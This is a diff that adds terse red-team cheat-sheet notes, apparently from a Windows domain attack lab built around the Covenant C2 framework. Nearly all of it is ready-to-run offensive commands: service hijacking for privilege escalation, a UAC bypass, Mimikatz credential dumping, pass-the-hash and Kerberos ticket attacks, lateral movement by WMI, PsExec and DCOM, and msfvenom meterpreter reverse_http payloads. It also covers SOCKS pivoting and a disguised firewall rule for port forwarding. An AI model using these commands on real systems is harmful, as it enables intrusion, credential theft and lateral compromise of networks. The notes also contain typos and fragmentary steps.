@@ -23,8 +23,262 @@ SharpUp
 Watson
 WindowsService
 
-#SMB TO SMB
-Connect localhost pipensmb
+Weak Service Permissions
+SharUp
+PowerShell 'CYBER AI Service' | Get-ServiceAcl | Select-Object -ExpandProperty Access
+Upload /filepath:"C:\Windows\Temp\GruntSMB_svc.exe"
+Shell sc config "CYBER AI Service" binPath= "C:\Windows\Temp\GruntSMB_svc.exe"
+Shell sc qc "CYBER AI Service"
+Shell sc stop "CYBER AI Service"
+Shell sc start "CYBER AI Service"
+
+Unquoted Service Paths
+C:\Program Files\CYBER\CYBER FW\FwSvc.exe
+
+Always Install Elevated
+
+UAC Bypasses
+SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"
+(rasta) > BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
+
+
+--Grunt Service Binary --
+--Connect localhost rastasvc--
+--pesexec or wmiexec --powershell
+
+---------------------------------------------------------------------------------------
+#DOMAIN RECONNAISSANCE
+
+Get-Domain
+PowerShell Get-Domain
+PowerShell Get-DomainController | Select-Object Forest, Name, OSVersion
+PowerShell Get-ForestDomain
+PowerShell Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess                      Get-DomainPolicy
+PowerShell Get-DomainUser -Identity j.hunt -Properties DisplayName, MemberOf | Format-List    Get-DomainUser
+PowerShell Get-DomainComputer -Properties DnsHostName | Sort-Object -Property DnsHostName     Get-DomainComputer
+PowerShell Get-DomainOU -Properties Name | Sort-Object -Property Name                         Get-DomainOU
+PowerShell Get-DomainGroup -Identity 'Domain Admins' | Select-Object -ExpandProperty Member   Get-DomainGroup
+PowerShell Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName Get-DomainGroupMember
+PowerShell Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName          Get-DomainGPO
+PowerShell Get-DomainGPO -ComputerIdentity wkstn-1555 -Properties DisplayName | Sort-Object -Property DisplayName  
+PowerShell Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName                  Get-DomainGPOLocalGroup
+PowerShell Find-DomainUserLocation | Select-Object UserName, SessionFromName                  Find-DomainUserLocation
+PowerShell Get-NetLocalGroup | Select-Object GroupName                                        Get-NetLocalGroup
+PowerShell Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain   Get-NetLocalGroupMember
+PowerShell Get-NetLoggedOn                                                                    Get-NetLoggedOn
+PowerShell Get-NetSession -ComputerName fs-1 | Select-Object CName, UserName                  Get-NetSession
+PowerShell Get-DomainTrust                                                                    Get-DomainTrust
+
+-----------------
+BloodHound
+-----------------
+ Assembly /assemblyname:"SharpHound3" /parameters:"-c All GPOLocalGroup"
+ 
+ ---------------------------------------------------------------------------
+ #Credentials & User Impersonation
+ 
+ LogonPasswords 
+ Mimikatz sekurlsa::logonpasswords
+ hashcat -a 3 -m 1000 nlamb.ntlm
+ SafetyKatz
+
+ Security Account Manager
+ Mimikatz token::elevate lsadump::sam
+
+ Token Impersonation
+ ImpersonateProcess and ImpersonateUser 
+ RevToSelf
+ 
+ Domain Cached Credentials
+ Mimikatz token::elevate lsadump::cache
+ 
+ MakeToken
+ MakeToken n.lamb cyberbotic.io REDACTED
+ 
+ Overpass-the-Hash TGT
+ Rubeus triage
+ Rubeus asktgt /user:n.lamb /rc4:REDACTED          or add /ptt
+ copy the ticket clean space on line
+ MakeToken n.lamb cyberbotic.io DoesNotMatter
+ Rubeus triage
+ Rubeus ptt /ticket:doIFXDCCBVi[...snip...]bDWN5YmVyYm90aWMuaW8=
+ \\wkstn-4945\c$\$Recycle.Bin 
+ 
+ PowerShellRemotingCommnad maquina "whoami, hostname"
+ 
+ Process Injection
+ 
+ ---------------------------------------------------------------------------------
+ #Password Cracking
+ 
+ NTLM
+ hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt
+ john --wordlist= D:\Tools\rockyou.txt 
+ 
+ Lateral Movement
+ Windows Management Instrumentation (WMI)
+ wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"REDACTED" process call create "powershell -enc [...snip...]"
+ SharpWMI /command:"action=exec computername=wkstn-4945 command=\"C:\Windows\Temp\GruntHTTP.exe\""
+ PowerShell Remoting
+ PowerShellRemotingCommand wkstn-4945 "powershell -enc [...snip...]"
+ PowerShellRemotingCommand wkstn-4945 "whoami; hostname" cyberbotic.io n.lamb REDACTED
+ PsExec
+ upload windows tasks
+ psexec wkstn-4945 servicebinary
+ connect wkstn-4945 rastasvc
+ 
+ DCOM
+ HKEY_CLASSES_ROOT\CLSID
+ DCOMGrunt wkstn-4945 powershell 
+ Hunting DCOM Opportunities
+ Get-ChildItem -Path Registry::HKCR\CLSID -Name | select -First 5
+ Get-ChildItem -Path Registry::HKCR\CLSID -Name | select -Skip 1 | Out-File CLSIDs.txt
+ 
+ Session IDs
+ ProcessList / ps
+ 1 best
+ 
+-----------------------------------------------------------------------------------------
+Maintain Presence
+SharpShell
+SharpShell var defender = SCM.GetService("wkstn-4945", "WinDefend"); return defender.Status.ToString(); DEFENDER
+
+#Session Passing
+
+set payload windows/x64/meterpreter/reverse_http
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=8080 EXITFUNC=thread -f raw -o /tmp/msf.bin
+
+set payload windows/meterpreter/reverse_http
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=8080 EXITFUNC=thread -f raw -o /tmp/msf.bin
+
+find 1 process x64 or x86
+ps
+or
+sharpshell var target = System.Diagnostics.Process.Start("notepad"); return target.Id.ToString();
+
+#SOCKS Proxies
+use auxiliary/server/socks4a
+run -j
+route add 10.0.0.0/8 1
+route add 10.10.0.0/16 1
+proxychains nmap -n -sT -Pn -p445 10.10.120.1
+
+Impacket
+proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes e353da88f9c4331504f70d471f0f9cb1:REDACTED n.glover@10.10.120.1
+proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
+
+Windows
+sudo proxychains socat TCP4-Listen:445,fork TCP:10.10.120.1:445
+mimikatz # privilege::debug
+mimikatz # sekurlsa::pth /user:n.glover /domain:cyberbotic.io /ntlm:REDACTED
+C:\Windows\system32>dir \\kali\c$
+
+PowerShell Remoting
+sudo proxychains socat TCP4-Listen:5985,fork TCP:10.10.120.1:5985
+mimikatz # sekurlsa::pth /user:n.glover /domain:cyberbotic.io /ntlm:REDACTED /run:powershell
+Enter-PSSession -ComputerName kali
+
+#Tunnelling Metasploit
+setg Proxies socks4:127.0.0.1:1080
+use exploit/windows/smb/psexec
+
+#Reverse Port Forwards
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x
+netsh advfirewall firewall add rule name="Totally Legit Rule" dir=in action=allow protocol=TCP localport=8080
+meterpreter > portfwd add -R -p 8080 -l 80 -L 10.8.0.6
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
